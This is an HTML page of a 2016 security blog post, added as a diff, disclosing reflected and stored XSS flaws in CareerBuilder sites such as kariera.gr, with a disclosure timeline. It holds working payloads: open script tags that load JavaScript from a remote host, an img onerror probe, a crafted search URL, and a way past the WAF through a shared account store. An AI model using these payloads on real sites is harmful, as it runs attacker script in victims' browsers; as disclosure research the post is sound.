@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+
+    <link rel="stylesheet" type="text/css" href="http://www.economyofmechanism.com/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="http://www.economyofmechanism.com/theme/stylesheet/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="http://www.economyofmechanism.com/theme/stylesheet/font-awesome.min.css">
+
+
+    <link href="http://www.economyofmechanism.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Economy of mechanism Atom">
+
+
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="index, follow" />
+
+<meta name="author" content="Ioannis Kakavas" />
+<meta name="description" content="Reflected and Stored XSS in multiple careerbuilder sites" />
+<meta name="keywords" content="XSS">
+<meta property="og:site_name" content="Economy of mechanism"/>
+<meta property="og:title" content="Your WAF alone, is not enough, not enough, not enough"/>
+<meta property="og:description" content="Reflected and Stored XSS in multiple careerbuilder sites"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="http://www.economyofmechanism.com/careerbuilder-xss.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2016-05-27 00:00:00+03:00"/>
+<meta property="article:modified_time" content="2016-06-06 17:40:00+03:00"/>
+<meta property="article:author" content="http://www.economyofmechanism.com/author/ioannis-kakavas.html">
+<meta property="article:section" content="research"/>
+<meta property="article:tag" content="XSS"/>
+<meta property="og:image" content="">
+  <title>Economy of mechanism &ndash; Your WAF alone, is not enough, not enough, not enough</title>
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="http://www.economyofmechanism.com">
+        <img src="http://www.economyofmechanism.com/theme/img/profile.png" alt="" title="">
+      </a>
+      <h1><a href="http://www.economyofmechanism.com"></a></h1>
+      <p>Security is hard</p>
+      <nav>
+        <ul class="list">
+          <li><a href="http://www.economyofmechanism.com/pages/about.html#about">About</a></li>
+          <li><a href="http://www.geocreepy.com" target="_blank">geocreepy</a></li>
+        </ul>
+      </nav>
+      <ul class="social">
+        <li><a class="sc-twitter" href="https://twitter.com/ilektrojohn" target="_blank"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/jkakavas" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-linkedin" href="https://linkedin.com/in/jkakavas" target="_blank"><i class="fa fa-linkedin"></i></a></li>
+        <li><a class="sc-rss" href="//economyofmechanism.com/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+      </ul>
+    </div>
+  </aside>
+  <main>
+    <nav>
+      <a href="http://www.economyofmechanism.com">Home</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+      <a href="http://www.economyofmechanism.com/feeds/all.atom.xml">Atom</a>
+    </nav>
+
+<article>
+  <header>
+    <h1 id="careerbuilder-xss">Your WAF alone, is not enough, not enough, not enough</h1>
+    <p>Posted on Παρ 27 Μάιος 2016 in <a href="http://www.economyofmechanism.com/category/research.html">research</a></p>
+  </header>
+  <div>
+    <div class="section" id="tl-dr">
+<h2>TL;DR</h2>
+<p>A number of XSS vulnerabilities were identified in multiple sites owned by CareerBuilder</p>
+</div>
+<div class="section" id="introduction">
+<h2>Introduction</h2>
+<p><a class="reference external" href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29">Cross-site Scripting (XSS)</a> is not new, not fancy, and sometimes frowned upon by security researchers as low hanging
+fruits that are not worth the fuss that is made about them. I'm not exactly sure where I stand on the matter, but I do enjoy the occasional XSS hunt, especially if there is more to it than
+entering the payload in a GET parameter and popping the alert box. This is one of a series of posts on XSS vulnerabilities that I have found in some sites that I consider worth sharing, either
+because of the target or some complexity/fun in exploiting them.</p>
+</div>
+<div class="section" id="careerbuilder">
+<h2>CareerBuilder</h2>
+<p>CareerBuilder, according to them &quot;has the largest online job site in the U.S., but we're more than just a job board. We are the global leader in human capital solutions. Through constant innovation, unparalleled technology, and customer care delivered at every touch point, CareerBuilder helps match the right talent with the right opportunity more often than any other site.&quot;
+They have presence in more than 60 countries worldwide</p>
+<blockquote>
+<ul class="simple">
+<li>www.careerbuilder.com (Alexa ranking : 462 in U.S., 1,741 worldwide)</li>
+<li>www.careerbuilder.co.uk (Alexa ranking :  2.915 in UK)</li>
+<li>www.careerbuilder.es</li>
+<li>www.careerbuilder.fr</li>
+<li>www.careerbuilder.se (Alexa ranking : 943 in Sweden)</li>
+<li>www.kariera.gr (Alexa ranking : 97 in Greece)</li>
+</ul>
+</blockquote>
+<p>etc.</p>
+<div class="section" id="reflected-xss">
+<h3>Reflected XSS</h3>
+<p>I started my probing around from <a class="reference external" href="http://www.kariera.gr">the greek version</a> in their search field, using my favorite &quot;xxxxx'yyyyy&lt;/img that I have long &quot;stolen&quot; from <a class="reference external" href="http://respectxss.blogspot.com">Ashar</a> and saw that none of the &quot;, ', &lt;, / were escaped as can be seen in the following screenshot</p>
+<div class="figure">
+<img alt="&quot;xxxxx'yyyyy&lt;img echoed back unescaped :width: 80 %" src="/images/kariera-1.png" />
+</div>
+<p>It can be seen that the first X and the I are capitalized ( this comes into play later on ). Ok, it looks like it can be exploited, what do we try next?</p>
+<p>So, let's try to add an html tag and see if that goes through. I probe with &lt;img&gt; and get the following:</p>
+<div class="figure">
+<img alt="&lt;img&gt; echoed back escaped :width: 80 %" src="/images/kariera-2.png" />
+</div>
+<p>&lt; and &gt; are replaced by their unicode representation. The same happens with all tags that are closed. So no luck using payloads directly in the search parameter.</p>
+<p>Next I tried invoking JavaScript in the onerror of an &lt;img&gt; tag, as I thought it would not be necessary to close the tag, it would be closed by the next available '&gt; character in the html.
+I entered <em>&lt;img src=&quot;X&quot; onerror=&quot;confirm(1);&quot;</em> and waited for my confirm box to pop, but nothing. I could see the image placeholder in the page,</p>
+<div class="figure">
+<img alt="img error attempt 1" src="/images/kariera-3.png" style="width: 67%;" />
+</div>
+<p>but no JavaScript was executed. Checking the source, I got the following:</p>
+<div class="figure">
+<img alt="img error attempt 2" src="/images/kariera-4.png" style="width: 80%;" />
+</div>
+<p>That should pop right? Wrong. JavaScript functions are of course case sensitive and <strong>Confirm()</strong> is not the same as <strong>confirm()</strong>.</p>
+<p><em>Security by UX</em> as the web developer obviously thought that it would look nice if they capitalized the first letter of any given &quot;word&quot;..</p>
+<p>But then, it hit me. I might not be able to inject &lt;script&gt; tags with inline Javasript code to be executed, both because of the capitalization of words and the fact that full tags are escaped, but if I can use an open <em>&lt;img</em> tag, then I could use an open <em>&lt;script</em> tag to load a malicious script from a remote server. CSP might cause a problem, but it didn't feel like they would have
+bothered with using CSP in the first place. I took a look at the response headers and verified my thoughts</p>
+<div class="figure">
+<img alt="kariera.gr response headers" src="/images/kariera-response-headers.png" style="width: 80%;" />
+</div>
+<p>First attempt with this kind of payload was <em>&lt;script src=&quot;http://XXX.XXX.XXX.XXX/testxss/mal.js&quot;</em> where mal.js contained just an alert. Shockingly enough, I did not get anything from the browser. I took a look at my server logs to see if everything was ok and the culprit revealed itself :</p>
+<p><em>[31/Mar/2016:17:56:25 +0300] &quot;GET *</em>/Testxss/Mal.Js** HTTP/1.1&quot; 404 703 *</p>
+<p>Sure enough the capitalization function had messed up the payload before reflecting it back to me, which caused a request to the wrong path. Quick solution was to host my JavaScript in a all capital path and name it MAL.JS so that the payload became : <em>&lt;script src=&quot;http://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&quot;</em> (XSS RAGE!!!). Hit the search button and got an alert box</p>
+<div class="figure">
+<img alt="Reflected XSS" src="/images/kariera-reflected-xss.png" style="width: 80%;" />
+</div>
+</div>
+<div class="section" id="stored-xss">
+<h3>Stored XSS</h3>
+<p>So, if these controls are in place for the search input, what would be different for other user related input?</p>
+<p>Nothing, as it turns out.</p>
+<p>I created a test user and soon enough identified that most of the user form data are vulnerable to the same payload that was used in the search form</p>
+<div class="figure">
+<img alt="Registration form" src="/images/kariera-registration-form.png" style="width: 50%;" />
+</div>
+<p>So I set my first name as <em>Χρήστος&lt;script src=&quot;http://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&quot;</em>, successfully submitted the form, and upon reload I was greeted by yet another alert box</p>
+<div class="figure">
+<img alt="kariera.gr stored  XSS" src="/images/kariera-stored-xss.png" style="width: 50%;" />
+</div>
+<p>The same payload was used on other input fields of the registration form but the vulnerability was prevalent in all parts of the web application. For example, I was able to upload a CV with the name <em>my_cv&lt;script src=&quot;https://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&quot;</em>, and it would be happily consumed, resulting in the following anytime I accessed my CV page.</p>
+<div class="figure">
+<img alt="kariera.gr stored  XSS CV" src="/images/kariera-stored-xss-cv.png" style="width: 50%;" />
+</div>
+<p>What's interesting, is why exactly this payload works. Let's take a look at the source code:</p>
+<div class="figure">
+<img alt="kariera.gr stored  XSS source" src="/images/kariera-stored-xss-source.png" style="width: 50%;" />
+</div>
+<p>Starting on line 131 we see our payload injected. The <em>&lt;/h3&gt;</em> on line 132, and the closing <em>&gt;</em> in particular closes our &lt;script&gt; which effectively becomes</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&quot;</span> <span class="err">&lt;/</span><span class="na">h3</span><span class="p">&gt;</span>
+</pre></div>
+<p>The script is closed by the closing <em>&lt;/script&gt;</em> tag in line 462 and everything in between is not rendered.</p>
+<p>Depending on the distance between where our payload is injected in the page and the next <em>&lt;/script&gt;</em> closing tag, a lot oh HTML/JS can be disregarded, which might affect how the page is rendered in the victim's browser. On the other hand we can inject anything we want from our mal.js script so with a little more work we can make the page look as benign as the original.</p>
+</div>
+<div class="section" id="going-global">
+<h3>Going Global</h3>
+<p>Having identified these issues in the Greek version of the website, I thought that since all the careerbuilder network websites look pretty much similar, they are based
+on the same implementation and thus vulnerable to the same attacks. Since, obviously, the impact of a stored XSS on careerbuilder.com is much bigger than one on kariera.gr, I pointed my browser to www.careerbuilder.com and used the same payload. Well, tough luck..</p>
+<div class="figure">
+<img alt="careerbuilder.com WAF" src="/images/kariera-waf.png" style="width: 50%;" />
+</div>
+<p>It looks like they are using some kind of Web Application Firewall that detects the XSS payload in the request and denies it. The same was true for all my attempts to create an account in careerbuilder.com injecting the payloads in the form fields or CV uploads as before. The same, unsuccessful, results in all the other national versions of the careerbuilder websites. All that I checked were protected by the same WAF.</p>
+<p>But, all the above versions of the website have something in common. The user account repository. In short, I could create an account in kariera.gr which is vulnerable, and then use these credentials to log in to www.careerbuilder.com, where I got the following</p>
+<div class="figure">
+<img alt="kariera.gr stored  XSS" src="/images/careerbuilder-stored-xss.png" style="width: 50%;" />
+</div>
+</div>
+<div class="section" id="threat-model">
+<h3>Threat Model</h3>
+<ol class="arabic simple">
+<li>Unregistered_attacker: An attacker with no account on the website could create a crafted URL and trick a victim into requesting the URL, which would cause the user's browser to execute arbitrary JavaScript code. This would not work on Chrome, as the XSS protection kicks in and mitigates the reflected XSS attempt.</li>
+</ol>
+<div class="highlight"><pre><span></span>https://www.kariera.gr/intl/jobseeker/jobs/jrp.aspx?HdnIFlexSearchBox=1<span class="err">&amp;</span>_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AhihLanguage=GRGreek<span class="err">&amp;</span>IPath=QH<span class="err">&amp;</span>sc_cmp1=JS_GR_QSB_GEN<span class="err">&amp;</span>_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_Rawwords=%22%2F%3Esecurity+%3Cscript+src%3D%22https%3A%2F%2F1.1.1.1%2FTESTXSS%2FMAL.JS%22<span class="err">&amp;</span>_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_City1=%CE%91%CE%B8%CE%AE%CE%BD%CE%B1<span class="err">&amp;</span>sbmt=%CE%95%CF%8D%CF%81%CE%B5%CF%83%CE%B7+%CE%91%CE%B3%CE%B3%CE%B5%CE%BB%CE%B9%CF%8E%CE%BD<span class="err">&amp;</span>_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_States=
+</pre></div>
+<ol class="arabic simple" start="2">
+<li>Registered_attacker: An attacker with an account on the website could edit their contact details in order to include arbitrary externally hosted JavaScript. Then,the browser of anyone seeing their profile, or their contact details if included in search results or other views would execute that. Potential victims include employers looking for candidates, site administrators, etc.</li>
+<li>Registered_employer: An attacker with an employer account on the website could upload a job advert with arbitrary externally hosted JavaScript.Then,the browser of anyone seeing that advert, or if it was returned in a search result would execute that. Potential victims include candidates looking for jobs, site administrators, etc.</li>
+</ol>
+</div>
+</div>
+<div class="section" id="disclosure-timeline">
+<h2>Disclosure Timeline</h2>
+<blockquote>
+<ul class="simple">
+<li>01/04/2016: Contacted <a class="reference external" href="mailto:TSST&#64;careerbuilder.com">TSST&#64;careerbuilder.com</a> looking for a contact where I could disclose my report.</li>
+<li>01/04/2016: Trust and Site Security Team replied that I could share the report with them.</li>
+<li>04/04/2016: Sent the detailed report to TSST including PoCs and screenshots.</li>
+<li>25/04/2016: Sent a reminder to TSST inquiring about the process.</li>
+<li>10/05/2016: Sent a reminder to TSST inquiring about the process.</li>
+<li>10/05/2016: TSST replied that they are looking into the matter.</li>
+<li>26/05/2016: Sent a reminder to TSST inquiring about the process.</li>
+<li>26/05/2016: TSST replied that the WAF has been deployed in all their national websites, thus they consider the issue solved.</li>
+<li>06/06/2016: Public Disclosure.</li>
+</ul>
+</blockquote>
+</div>
+
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="http://www.economyofmechanism.com/tag/xss.html">XSS</a>
+    </p>
+  </div>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'jkakavas';
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+</article>
+
+    <footer>
+<p>
+  &copy; Ioannis Kakavas 2016 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>
+</p>
+<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
+  <a rel="license"
+     href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+     target="_blank">
+    <img alt="Creative Commons License"
+         title="Creative Commons License"
+         style="border-width:0"
+         src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png"
+         width="80"
+         height="15"/>
+  </a>
+</p>    </footer>
+  </main>
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-76540948-1', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "name": "Your WAF alone, is not enough, not enough, not enough",
+  "headline": "Your WAF alone, is not enough, not enough, not enough",
+  "datePublished": "2016-05-27 00:00:00+03:00",
+  "dateModified": "2016-06-06 17:40:00+03:00",
+  "author": {
+    "@type": "Person",
+    "name": "Ioannis Kakavas",
+    "url": "http://www.economyofmechanism.com/author/ioannis-kakavas.html"
+  },
+  "image": "{{ SITEURL }}/{{ THEME_STATIC_DIR }}/img/profile.png",
+  "url": "http://www.economyofmechanism.com/careerbuilder-xss.html",
+  "description": "Reflected and Stored XSS in multiple careerbuilder sites"
+}
+</script></body>
+</html>
